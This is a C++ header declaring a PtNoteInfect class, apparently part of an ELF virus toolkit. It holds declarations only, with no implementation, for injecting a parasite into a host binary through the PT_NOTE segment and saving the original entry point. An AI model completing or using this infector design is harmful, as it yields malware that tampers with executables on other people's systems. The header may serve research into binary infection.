#pragma once
#include <elf.h>
#include <span>

namespace vt::infector {

class PtNoteInfect {
 public:
  size_t injected_host_size();

  bool analyze(std::span<const std::byte> host_mapping,
               std::span<const std::byte> parasite_mapping);

  bool inject(std::span<std::byte> host_mapping,
              std::span<const std::byte> parasite_mapping);

 private:
  size_t host_size_{};
  size_t parasite_size_{};
  Elf64_Addr original_e_entry_{};
  Elf64_Off original_pt_note_file_offset_{};
  Elf64_Addr parasite_load_address_{};
  Elf64_Xword pt_load_alignment_{};
  size_t pt_note_to_be_infected_idx_{};
};

}  // namespace vt::infector